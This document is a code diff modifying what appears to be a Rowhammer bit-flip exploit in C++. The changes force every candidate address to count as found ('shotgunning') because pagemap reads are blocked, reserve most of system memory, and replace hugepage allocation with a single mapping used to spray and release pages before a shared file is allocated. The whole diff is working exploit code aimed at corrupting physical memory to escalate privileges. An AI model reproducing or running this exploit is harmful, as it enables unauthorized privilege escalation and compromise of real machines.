@@ -1,4 +1,4 @@
-//Modified to first use 1GB pages.
+
 #include <assert.h>
 #include <elf.h>
 #include <errno.h>
@@ -17,10 +17,13 @@
 
 #include <algorithm>
 #include <vector>
-//multiply by 6. MODIFIED.
-//roughly 
+// Modifications:
+// Memory size - change memory size to use up a majority of available memory (~80%)
+// Since Linux kernel 4.0, userspace processes are no longer allowed to read /proc/{PID}/pagemap
+// hence, modifying code to not call physical page number translations and instead shotguns.
+
 const size_t memory_size = ((size_t) 900 * 6 ) << 20;
-const size_t size2mb = ((size_t) 2) << 20;
+
 const size_t large_page = 2 << 20;
 const size_t page_size = 0x1000;
 
@@ -289,6 +292,8 @@ BitFlipper *find_bit_flipper(const char *addrs_file) {
            (long long) addrs->agg2,
            (long long) addrs->victim,
            found ? "found" : "missing");
+	   // shotgunning
+	   found = true;
     if (found) {
       if (flipper->initial_hammer()) {
         int bit = flipper->get_bit_number();
@@ -298,7 +303,6 @@ BitFlipper *find_bit_flipper(const char *addrs_file) {
           printf("Useful bit flip -- continuing...\n");
           flipper->unmap_other_pages(&finder);
           flipper->retry_to_check();
-          printf("Useful bitflip found\n");
           return flipper;
         } else {
           printf("  We don't know how to exploit a flip in bit %i\n", bit);
@@ -333,33 +337,26 @@ void flip_bit() {
 class Fragmenter {
   static const size_t reserve_size = memory_size;
   static const size_t num_pages = reserve_size / page_size;
-  uintptr_t *mem1;
-  uintptr_t mem2;
+  uintptr_t mem;
   uint32_t *pages;
   size_t current_page;
 
   uintptr_t get_page_addr(size_t idx) {
     assert(idx < num_pages);
-    return mem1[idx] + pages[idx] * page_size;
+    return mem + pages[idx] * page_size;
   }
 
 public:
   Fragmenter() {
-	// Originally we will allocate all the memory at one go.
-	// This time we will allocate 1 1gb Hugepage first.
+    mem = (uintptr_t) mmap(NULL, reserve_size, PROT_READ | PROT_WRITE,
+                           MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
+    assert(mem != (uintptr_t) MAP_FAILED);
+
     assert(num_pages == (uint32_t) num_pages);
     pages = new uint32_t[num_pages];
-    mem1 = new uintptr_t[num_pages];
     assert(pages);
-
-    for (size_t i = 0; i < num_pages; ++i) {
+    for (size_t i = 0; i < num_pages; ++i)
       pages[i] = i;
-      printf("Attempting to allocate memory in fragmenter: i = %zu\n", i); 
-      mem1[i] = (uintptr_t) mmap(NULL, size2mb , PROT_READ | PROT_WRITE,
-                         MAP_PRIVATE | MAP_ANON | MAP_POPULATE | MAP_HUGETLB, -1, 0);
-      assert(mem1[i] != (uintptr_t) MAP_FAILED);
-    }
-
     std::random_shuffle(pages, &pages[num_pages]);
     current_page = 0;
 
@@ -368,7 +365,6 @@ public:
       *(int *) get_page_addr(i) = 0x9999;
     }
   }
-
 
   uintptr_t next_page_addr() {
     return get_page_addr(current_page);
@@ -379,12 +375,11 @@ public:
       int *addr = (int *) get_page_addr(current_page);
       // Mark the page for debugging purposes.
       *addr = 0x8888;
-      printf("addr = %p\n", addr);
+
       // We don't use munmap() here because that is likely to split
       // the VMA in two, which may exceed Linux's limit on the number
       // of VMAs per process.
-      int rc = madvise(addr, size2mb, MADV_DONTNEED);
-      perror("madvise:   ");
+      int rc = madvise(addr, page_size, MADV_DONTNEED);
       assert(rc == 0);
       current_page++;
     }
@@ -574,7 +569,6 @@ void main_prog(int test_mode, const char *addrs_file) {
   BitFlipper *flipper = NULL;
   if (!test_mode)
     flipper = find_bit_flipper(addrs_file);
-  printf("wtf segfault?\n");
   Fragmenter fragmenter;
   if (test_mode)
     init_dev_mem();
@@ -639,9 +633,8 @@ void main_prog(int test_mode, const char *addrs_file) {
   assert(rc == 0);
 
   // Release enough pages so that we can allocate the file.
-  printf("releasing bytes to allocate shared file...\n");
   fragmenter.release_bytes(file_size);
-  printf("Released\n"); 
+
   struct timeval t0;
   rc = gettimeofday(&t0, NULL);
   assert(rc == 0);
